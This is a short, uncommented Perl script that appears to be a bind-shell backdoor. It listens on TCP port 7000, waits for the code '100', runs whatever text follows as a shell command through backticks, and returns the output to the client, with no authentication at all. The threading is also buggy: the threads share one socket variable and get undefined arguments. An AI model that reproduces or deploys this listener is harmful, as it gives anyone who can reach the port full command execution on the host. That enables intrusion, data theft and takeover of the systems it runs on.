use IO::Socket;
use threads;
my $sock = new IO::Socket::INET (
                                  LocalPort => '7000',
                                  Proto => 'tcp',
                                  Listen => 1,
                                  Reuse => 1,
                                 );
 die "Could not create socket: $!\n" unless $sock;
 my $new_sock;
 my @thr;
 my $i=0;
while(1) {
    $new_sock = $sock->accept();
    $thr[$i] = threads->new(\&handle_tcp, $opt_c,$port,$size,65+$i);
    $i++;
    print $i;
}
close($sock);

sub handle_tcp {
#    sysread($new_sock,$msg,30);
#    syswrite(\*STDOUT,$msg);
    syswrite($new_sock,"Yes\n");
    sysread($new_sock,$msg,3);
    if($msg == 100 ) {
    	sysread($new_sock,$msg,100);
        syswrite(\*STDOUT,$msg);
        my $cmd = substr($msg,3);
        chomp($cmd);
        syswrite(\*STDOUT,substr($msg,3));
        my $result = `$cmd`;
#	$result = substr($result,-1);
#        chomp($result);
        syswrite($new_sock,$result);
	syswrite($new_sock,"Done sending to client");
    }
    close($new_sock);

}